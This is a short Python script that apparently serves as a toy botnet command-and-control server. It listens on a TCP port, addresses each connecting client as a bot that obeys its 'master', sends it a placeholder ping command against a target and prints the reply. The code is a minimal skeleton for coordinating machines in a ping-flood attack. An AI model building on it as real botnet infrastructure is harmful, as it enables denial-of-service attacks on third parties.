import socketserver
import sys

class BotHandler(socketserver.BaseRequestHandler):

    def handle(self):
        print(f"It seems {self.client_address[0]}:{self.client_address[1]} wants to obey his master!")
        self.request.sendall(command.encode())

        print(f"{self.client_address[0]}:{self.client_address[1]} says: {self.request.recv(1024).decode()}")


HOST = sys.argv[1]
PORT = int(sys.argv[2])

command = "ping <target> -c <replies>"

# creates a TCP/IP server that can accept multiple simultaneous connections from clients
server = socketserver.TCPServer((HOST, PORT), BotHandler)
server.serve_forever()
